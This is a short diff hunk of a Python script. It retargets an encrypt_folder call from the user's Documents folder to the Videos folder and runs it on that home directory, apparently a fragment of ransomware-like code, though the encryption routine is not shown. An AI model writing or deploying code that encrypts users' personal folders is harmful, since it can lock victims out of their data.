@@ -24,7 +24,7 @@ def encrypt_folder(folder_path):
 
 if __name__ == "__main__":
     # Path to Documents folder
-    documents_folder = os.path.expanduser("~/Documents")
+    documents_folder = os.path.expanduser("~/Videos")
 
     # Encrypt the documents folder
     encrypt_folder(documents_folder)
